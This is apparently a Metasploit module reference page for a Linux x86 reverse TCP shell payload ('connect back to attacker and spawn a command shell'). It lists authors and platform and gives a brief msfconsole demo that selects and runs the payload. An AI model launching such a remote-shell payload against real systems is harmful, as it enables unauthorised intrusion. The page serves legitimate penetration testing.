## Linux Command Shell, Reverse TCP Inline - Metasm Demo

Connect back to attacker and spawn a command shell


## Module Name
payload/linux/x86/shell_reverse_tcp2

## Authors
* skape
* Yoann Guillot
* Julien Tinnes <julien[at]cr0.org>





## Platforms
linux

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/linux/x86/shell_reverse_tcp2
msf payload(shell_reverse_tcp2) > show targets
   ... a list of targets ...
msf payload(shell_reverse_tcp2) > set TARGET <target-id>
msf payload(shell_reverse_tcp2) > show options
   ... show and set options ...
msf payload(shell_reverse_tcp2) > run
```
    
    